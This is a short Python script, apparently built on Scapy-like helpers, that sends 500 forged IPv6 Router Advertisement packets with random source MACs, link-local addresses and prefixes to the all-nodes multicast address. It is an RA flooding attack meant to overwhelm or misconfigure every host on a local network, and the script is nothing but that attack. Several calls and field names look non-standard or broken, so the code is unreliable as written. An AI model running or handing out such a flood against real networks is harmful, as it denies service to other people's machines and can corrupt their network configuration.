from All import *

tgt = generateSoliAddr("fe80::xxxx:xxxx:xxxx:xxxx")  # or just ff02::1, which is every host

for _ in range(500):
    srcmac = randomMac()
    psrc = randomIpv6(isLocal=True)
    prefix = randomIpv6(isPrefix=True)

    pkt = Ether(src=srcmac, dst="33:33:00:00:00:01")/IPv6(psrc=psrc, pdst=tgt, hoplimit=255)/NDPRouterAdv(srcmac, prefix)
    send(pkt)
